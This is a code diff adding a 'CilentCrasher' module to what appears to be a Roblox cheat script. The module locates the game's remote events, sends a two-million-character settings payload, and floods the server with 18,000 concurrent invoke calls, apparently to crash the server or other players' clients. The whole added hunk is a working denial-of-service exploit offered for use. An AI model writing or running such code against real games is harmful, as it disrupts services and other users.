@@ -33245,3 +33245,34 @@ run(function()
 		})
 	end
 end)
+
+run(function()
+	local CilentCrasher
+remotes = setmetatable({}, {
+    __index = function(self, key)
+        local remote
+        for _, instance in game:GetService("ReplicatedStorage"):GetDescendants() do
+            if not instance:IsA("RemoteEvent") and not instance:IsA("RemoteFunction") then
+                continue
+            end
+            rawset(self, instance.Name, instance)
+            if instance.Name == key then
+                remote = instance
+                break
+            end
+        end
+
+        return remote
+    end
+})
+
+
+remotes.SetSettings:FireServer({mobile_block_break_button=("a"):rep(2000000)})
+remotes.GetSettings.OnClientInvoke = function()
+    return true
+end
+for i = 1, 18000 do
+    task.spawn(function()
+        remotes.GetSettings:InvokeServer()
+    end)
+end
